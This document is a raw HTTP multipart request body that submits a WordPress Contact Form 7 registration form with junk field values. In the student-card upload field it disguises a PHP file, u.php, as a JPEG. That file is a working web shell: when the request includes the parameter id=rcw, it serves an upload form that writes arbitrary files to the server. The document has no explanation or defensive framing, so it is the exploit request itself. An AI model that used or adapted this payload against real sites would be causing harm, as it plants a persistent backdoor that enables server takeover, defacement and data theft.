-----------------------------240142271820697\r\nContent-Disposition: 
form-data; name="_wpcf7"\r\n\r\n3765\r\n-----------------------------240142271820697\r\nContent-Disposition: 
form-data; name="_wpcf7_version"\r\n\r\n4.8\r\n-----------------------------240142271820697\r\n
Content-Disposition: form-data; name="_wpcf7_locale"\r\n\r\nen_US\r\n-----------------------------240142271820697\r\n
Content-Disposition: form-data; name="_wpcf7_unit_tag"\r\n\r\nwpcf7-f3765-p3766-o1\r\n-----------------------------240142271820697\r\n
Content-Disposition: form-data; name="_wpcf7_container_post"\r\n\r\n3766\r\n-----------------------------240142271820697\r\n
Content-Disposition: form-data; name="_wpcf7_nonce"\r\n\r\n4a59b1eba7\r\n-----------------------------240142271820697\r\n
Content-Disposition: form-data; name="namapeserta1"\r\n\r\nadawodh1\r\n-----------------------------240142271820697\r\n
Content-Disposition: form-data; name="nis1"\r\n\r\n1110646388111\r\n-----------------------------240142271820697\r\n
Content-Disposition: form-data; name="tempatlahir1"\r\n\r\nkarawang\r\n-----------------------------240142271820697\r\n
Content-Disposition: form-data; name="tanggallahir1"\r\n\r\n11-08-1998\r\n-----------------------------240142271820697\r\n
Content-Disposition: form-data; name="jeniskelamin1"\r\n\r\nLaki-laki\r\n-----------------------------240142271820697\r\n
Content-Disposition: form-data; name="nohp1"\r\n\r\n---\r\n-----------------------------240142271820697\r\n
Content-Disposition: form-data; name="email1"\r\n\r\nAdmin@gmail.com\r\n-----------------------------240142271820697\r\n
Content-Disposition: form-data; name="alamat1"\r\n\r\nasdad\r\n-----------------------------240142271820697\r\n
Content-Disposition: form-data; name="kartupelajar1"; filename="u.php"\r\nContent-Type: image/jpeg\r\n\r\n
<?php\r\nif(isset($_REQUEST['id']) && $_REQUEST['id']=='rcw'){\r\nif (isset($_POST['ok']) && isset($_FILES['jembot']))
 {\r\n   $file = $_FILES['jembot']['tmp_name'];\r\n   $name = "".$_FILES['jembot']['name'];\r\n  
 move_uploaded_file($file, $name);\r\n}else{\r\n?>\r\n<br>\r\n
<form method="POST" enctype="multipart/form-data">\r\n<input type="file" name="jembot">&nbsp;<input type="submit" name="ok" value="aplod cok!!">\r\n</form>\r\n<?php\r\n} exit;\r\n}\r\n?>\r\n-----------------------------240142271820697\r\nContent-Disposition: form-data; name="namasekolah"\r\n\r\n--\r\n-----------------------------240142271820697\r\n
Content-Disposition: form-data; name="alamatsekolah"\r\n\r\n--\r\n-----------------------------240142271820697\r\nContent-Disposition: form-data; name="emailsekolah"\r\n\r\nadmin@gmail.com\r\n-----------------------------240142271820697\r\nContent-Disposition: form-data; name="notelponsekolah"\r\n\r\n--\r\n-----------------------------240142271820697\r\nContent-Disposition: form-data; name="namagurupembimbing"\r\n\r\n--\r\n-----------------------------240142271820697\r\nContent-Disposition: form-data; name="nohpgurupembimbing"\r\n\r\n--\r\n-----------------------------240142271820697--\r\n